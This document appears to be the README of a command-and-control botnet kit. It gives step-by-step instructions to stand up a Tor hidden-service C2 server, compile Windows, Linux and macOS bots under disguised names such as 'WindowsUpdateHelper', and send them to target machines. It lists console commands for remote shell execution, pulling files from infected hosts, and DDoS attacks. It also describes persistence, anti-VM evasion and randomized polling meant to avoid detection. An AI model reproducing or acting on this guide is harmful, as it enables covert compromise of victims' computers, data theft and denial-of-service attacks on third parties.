# C2 Botnet - Full Setup Guide

## ONE-TIME SETUP (C2 Server - your main machine)

### Step 1: Install dependencies
pip install flask waitress requests cryptography pysocks

### Step 2: Run the setup script as root
sudo bash setup_c2.sh

This hardens the system, installs Tor, and creates a hidden service.
At the end it prints your ONION ADDRESS. SAVE IT.

### Step 3: Start the C2
python3 c2.py

At startup it prints your SHARED SECRET. SAVE IT.
C2 is now listening on http://127.0.0.1:8080 (only reachable through Tor).

## CONFIGURE & COMPILE BOT PAYLOADS

### Step 4: Edit the bot files
In ALL THREE files (windows_bot.py, linux_bot.py, macos_bot.py) replace:
  C2_ONION = "CHANGE_TO_YOUR_ONION_ADDRESS"      → your .onion
  SHARED_SECRET = "CHANGE_TO_C2_SECRET"           → the secret from c2.py

### Step 5: Compile to standalone binaries (run this ON EACH TARGET OS)

#### Windows (build on Windows):
pip install pyinstaller
pyinstaller --onefile --noconsole --name "WindowsUpdateHelper" windows_bot.py
Output: dist/WindowsUpdateHelper.exe

#### Linux (build on Linux):
pip3 install pyinstaller
pyinstaller --onefile --name ".systemd-logind-helper" linux_bot.py
Output: dist/.systemd-logind-helper

#### macOS (build on macOS):
pip3 install pyinstaller
pyinstaller --onefile --windowed --name "SoftwareUpdateHelper" macos_bot.py
Output: dist/SoftwareUpdateHelper  (or .app bundle)

### Step 6: Deploy
Send the compiled binary to the target machine.
Double-click or run it. That's it. No Python, no dependencies.

## C2 CONSOLE COMMANDS

Command              Description
─────────────────────────────────────────────────────────────
bots                 List all connected bots
secret               Show the shared secret
shell <prefix> <cmd> Execute shell command on a specific bot
                     (e.g. "shell abcd whoami")
broadcast <cmd>      Execute command on ALL bots
download <prefix> /path  Download a file from a bot
attack <target> <duration> <method>
                     Launch DDoS (methods: http, slowloris)
stop                 Stop active attack
help                 Show this menu

## TO UNINSTALL A BOT (kick it out & remove persistence)
C2> shell <prefix> uninstall

This kills the bot process, removes registry/systemd/cron/launchagent,
and wipes its files. The bot will never call back.

## FILE STRUCTURE
c2.py              - Command & Control server (run on your machine)
linux_bot.py       - Linux payload
windows_bot.py     - Windows payload
macos_bot.py       - macOS payload
setup_c2.sh        - Hardening script for C2 server
requirements.txt   - Python dependencies

## NOTES
- All bot communication goes through Tor (SOCKS5 on 127.0.0.1:9050)
- The C2 ONLY listens on 127.0.0.1:8080 - never exposed directly
- Bots auto-install Tor if not found (downloads static binary or uses apt/brew)
- Anti-VM triggers on most virtual machines (for testing, disable anti_vm())
- Poll interval is randomized 45-300 seconds to avoid pattern detection
